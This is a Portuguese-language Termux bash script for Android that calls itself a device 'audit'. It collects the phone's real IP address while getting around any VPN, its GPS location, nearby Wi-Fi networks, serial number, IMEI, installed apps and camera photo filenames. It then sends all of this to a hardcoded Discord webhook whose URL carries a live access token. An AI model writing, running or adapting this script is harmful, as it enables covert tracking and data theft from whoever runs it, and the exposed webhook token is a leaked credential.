#!/data/data/com.termux/files/usr/bin/bash

# CONFIGURACAO DO WEBHOOK
URL="https://discord.com/api/webhooks/1474865009459859467/FuON2EHoo1e9LjLPi9cZoeT3IwEO-FSUcW0T2MpSjnvY8MUhvHuGTHc6qq74fi4NF7Ho"

echo "Iniciando Varredura... (Aguarde 10-15 segundos)"

# 1. IP REAL (ANTI-VPN) COM TIMEOUT PARA NAO TRAVAR
# Tenta por Wi-Fi e depois por Dados Moveis, limite de 5 segundos cada
IP_VPN=$(curl -s --max-time 5 https://ifconfig.me)
IP_REAL=$(curl -s --interface wlan0 --max-time 5 https://ifconfig.me)
[ -z "$IP_REAL" ] && IP_REAL=$(curl -s --interface rmnet_data0 --max-time 5 https://ifconfig.me)

# 2. LOCALIZACAO AVANCADA (Requer Termux-API)
# Pega GPS, Provedor de Rede e Ultima Localizacao Conhecida
GPS_DATA=$(termux-location -p network -s last 2>/dev/null)
WIFI_SCAN=$(termux-wifi-scaninfo 2>/dev/null | grep "ssId" | head -n 5 | tr '\n' ' ')

# 3. IDENTIFICACAO E HARDWARE
MODELO=$(getprop ro.product.model)
MARCA=$(getprop ro.product.manufacturer)
SERIAL=$(getprop ro.serialno)
ANDROID_VER=$(getprop ro.build.version.release)
OPERADORA=$(getprop gsm.operator.alpha)
IMEI_FAKE=$(getprop ro.ril.miui.imei0) # Em alguns aparelhos funciona

# 4. ARQUIVOS E APPS
FILES_PHOTOS=$(ls /sdcard/DCIM/Camera 2>/dev/null | head -n 10 | tr '\n' ', ')
APPS=$(pm list packages -3 | cut -d: -f2 | head -n 10 | tr '\n' ', ')

# 5. MONTAGEM DO RELATORIO (TEXTO PURO)
PAYLOAD=$(cat <<EOF
{
  "content": "ALERTA: AUDITORIA DEEP SCAN ANDROID",
  "embeds": [
    {
      "title": "Dispositivo: $MARCA $MODELO",
      "color": 16711680,
      "fields": [
        { "name": "Conexao (Anti-VPN)", "value": "IP VPN: $IP_VPN\nIP REAL: ${IP_REAL:-Oculto/Falhou}\nOperadora: $OPERADORA", "inline": false },
        { "name": "Localizacao GPS", "value": "Dados: ${GPS_DATA:-Sem permissao ou GPS desligado}", "inline": false },
        { "name": "Redes WiFi Proximas", "value": "${WIFI_SCAN:-N/A}", "inline": false },
        { "name": "Identidade", "value": "Android: $ANDROID_VER\nSerial: $SERIAL", "inline": true },
        { "name": "Apps Recentes", "value": "${APPS:-N/A}", "inline": false },
        { "name": "Fotos (Nomes)", "value": "${FILES_PHOTOS:-Acesso Negado}", "inline": false }
      ],
      "footer": { "text": "Auditoria Finalizada com Sucesso" }
    }
  ]
}
EOF
)

# ENVIO
curl -H "Content-Type: application/json" -X POST -d "$PAYLOAD" $URL

echo "Finalizado. Verifique o Discord."
